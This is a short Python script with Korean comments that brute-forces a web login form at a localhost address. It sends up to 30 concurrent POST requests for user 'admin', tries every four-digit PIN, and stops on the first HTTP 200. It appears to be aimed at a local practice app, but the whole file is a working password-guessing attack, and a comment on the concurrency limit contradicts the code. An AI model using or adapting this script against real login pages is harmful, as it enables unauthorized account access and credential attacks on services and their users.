import aiohttp
import asyncio

# 대상 URL 설정
url = "http://localhost:5000/login"

# 비밀번호 찾기 플래그
found_password = asyncio.Event()

# 동시 요청을 10개로 제한하는 세마포어 설정
semaphore = None  # 세마포어를 글로벌로 선언하여 기존 루프에서 초기화

# 비동기 요청 함수
async def try_password(session, password):
    # 비밀번호가 이미 발견된 경우 작업 중단
    if found_password.is_set():
        return False

    async with semaphore:  # 동시에 n개 요청만 허용
        data = {
            "username": "admin",
            "password": password
        }

        async with session.post(url, data=data) as response:
            if response.status == 200:
                print(f"[SUCCESS] Password found: {password}")
                found_password.set()  # 성공 시 이벤트 설정
                return True
            else:
                print(f"[FAILED] Tried password: {password}")
                return False

# 비동기 메인 함수
async def main():
    global semaphore
    semaphore = asyncio.Semaphore(30)  # 메인 루프에서 세마포어 초기화
    async with aiohttp.ClientSession() as session:
        # 개별 태스크 리스트
        tasks = [asyncio.create_task(try_password(session, f"{i:04d}")) for i in range(10000)]

        # 작업 중 하나가 성공하면 나머지 작업을 취소
        for task in asyncio.as_completed(tasks):
            if await task:
                print("Password found and brute-force attack stopped.")
                for t in tasks:
                    t.cancel()
                await asyncio.gather(*tasks, return_exceptions=True)  # 태스크 취소 예외 무시
                break

# 이미 실행 중인 이벤트 루프가 있으면 해당 루프를 사용
try:
    asyncio.run(main())
except RuntimeError as e:
    if "This event loop is already running" in str(e):
        loop = asyncio.get_running_loop()
        loop.run_until_complete(main())
